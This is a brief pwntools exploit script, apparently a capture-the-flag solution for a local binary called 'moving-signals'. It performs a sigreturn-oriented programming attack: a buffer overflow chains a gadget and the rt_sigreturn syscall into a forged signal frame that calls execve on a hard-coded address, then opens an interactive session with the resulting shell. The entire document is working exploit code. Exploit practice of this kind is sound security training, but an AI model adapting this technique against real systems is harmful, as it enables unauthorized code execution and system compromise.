from pwn import *

p = process("./moving-signals")
#d = gdb.attach(p,gdbscript='''break * _start''')
context.clear(arch='amd64')
context.log_level='debug'

offset = b"A"*8
pop_gadget = 0x0000000000041018
zeroxf = 15
bash_addr = 0x7fffffffe380
syscall_ret  = 0x0000000000041015


frame = SigreturnFrame()
frame.rax = 59
frame.rdi = bash_addr
frame.rdx = 0
frame.rsp = 0
frame.rip = syscall_ret

p.sendline(offset+p64(pop_gadget)+p64(zeroxf)+p64(syscall_ret)+bytes(frame)+b"\x90"*20)

p.interactive()